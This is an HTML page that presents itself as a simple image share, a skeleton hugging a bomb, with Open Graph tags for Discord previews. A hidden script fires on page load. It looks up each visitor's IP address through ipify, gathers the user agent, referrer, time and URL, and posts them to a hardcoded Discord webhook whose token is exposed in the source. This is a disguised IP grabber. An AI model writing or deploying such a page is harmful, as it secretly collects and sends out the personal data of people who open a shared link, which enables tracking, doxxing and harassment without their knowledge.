<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bomb Skeleton</title>
  
  <!-- Open Graph for Discord / social previews -->
  <meta property="og:title" content="Bomb Skeleton">
  <meta property="og:description" content="">
  <meta property="og:image" content="https://i.imgur.com/2j4n48w.png">
  <meta property="og:type" content="website">
  
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      background: #000;
      overflow: hidden;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    img {
      max-width: 95vw;
      max-height: 95vh;
      object-fit: contain;
    }
  </style>
</head>
<body>
  <img src="https://i.imgur.com/2j4n48w.png" alt="Skeleton in bomber hat hugging a bomb">

  <script>
    // Your webhook â€“ visible in source! High spam risk if shared publicly.
    const webhookUrl = 'https://discord.com/api/webhooks/1462407993961480386/R49486d_gn1NRtuwvMWN2jwCgLxF6MeDa83LuCJQrkVxOJWTIGCuEhAepmgDey062pH5';

    async function logVisit() {
      try {
        // Get visitor IP
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        const ip = ipData.ip || 'unknown';

        // Extra info
        const ua = navigator.userAgent || 'unknown';
        const ref = document.referrer || 'direct';
        const page = window.location.href;
        const time = new Date().toISOString();

        const payload = {
          content: `**Bomb Skeleton page visited**\nIP: ${ip}\nUA: ${ua}\nReferrer: ${ref}\nTime: ${time}\nPage: ${page}`
        };

        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        console.log('Visit logged');
      } catch (err) {
        console.error('Log failed:', err);
      }
    }

    // Trigger on load
    window.addEventListener('load', logVisit);
  </script>
</body>
</html>
